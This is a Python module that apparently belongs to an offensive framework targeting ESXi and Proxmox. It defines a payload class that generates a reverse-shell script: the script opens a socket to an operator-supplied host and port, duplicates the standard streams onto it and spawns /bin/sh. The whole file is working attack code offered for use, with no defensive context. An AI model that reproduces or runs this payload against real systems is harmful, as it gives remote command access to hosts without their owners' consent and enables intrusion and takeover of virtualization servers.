class Payload:
    """
    Payload object describes a payload to run on an agent and provides
    the method gen_payload() to generate a payload with the appropriate
    user-selected options.
    """

    def __init__(self):

        self.info = {
            "name": "any-launch-reverse-shell",
            "description": "Launches a netcat reverse shell on the target system",
            "date": "2022-11-02",
            "author": "PSMTHS",
            "compatibility": "ESXi 6.7 EP 15,  Proxmox VE 4.0",
        }

        self.options = {
            "port": {
                "required": True,
                "info": "Port for the reverse shell to connect to",
                "defaults": "9001",
                "value": "",
            },
            "host": {
                "required": True,
                "info": "Host for the reverse shell to connect to (your machine's IP)",
                "defaults": None,
                "value": "",
            },
        }

    def set_defaults(self):
        """
        Set payload options to defaults
        """
        for option, value in self.options.items():
            value["value"] = value["defaults"]

    def gen_payload(self):

        host = self.options["host"]["value"]
        port = self.options["port"]["value"]

        self.set_defaults()

        payload_script = """
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("%(host)s",%(port)s))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
        
        """ % {
            "host": host,
            "port": port,
        }

        return payload_script
